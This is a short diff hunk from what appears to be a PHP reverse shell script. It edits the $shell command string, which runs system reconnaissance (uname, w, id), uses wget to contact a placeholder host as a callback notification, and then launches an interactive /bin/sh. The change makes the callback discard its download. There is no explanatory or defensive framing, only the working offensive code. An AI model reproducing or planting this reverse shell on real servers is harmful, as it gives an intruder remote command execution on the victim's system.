@@ -53,7 +53,7 @@ $port = LOCALPORT;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'uname -a; w; id; wget "LOCALHOST/php_shell_notify.txt" -q; /bin/sh -i';
+$shell = 'uname -a; w; id; wget "LOCALHOST/php_shell_notify.txt" -q -O /dev/null; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
